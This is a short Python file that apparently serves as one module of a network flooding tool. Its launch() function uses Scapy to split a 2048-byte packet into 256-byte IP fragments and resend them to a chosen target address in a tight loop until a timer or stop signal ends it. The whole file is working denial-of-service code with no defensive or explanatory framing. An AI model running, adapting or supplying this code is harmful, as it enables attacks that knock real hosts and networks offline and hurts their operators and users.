from scapy.all import IP, fragment, send
import time
import random

def launch(target_ip, port, duration, tag, stop_event, fail_tracker):
    payload = b'A' * 2048  # Will be fragmented
    pkt = IP(dst=target_ip)/payload
    fragments = fragment(pkt, fragsize=256)

    sent = 0
    lost = 0
    start_time = time.time()

    while not stop_event.is_set():
        if duration and (time.time() - start_time > duration):
            break

        try:
            send(fragments, verbose=0)
            sent += len(fragments)
        except Exception:
            lost += 1

        if lost > 20:
            print(f"[x] {tag} fragmented packet dropped repeatedly.")
            fail_tracker.append(tag)
            break

        time.sleep(0.01)
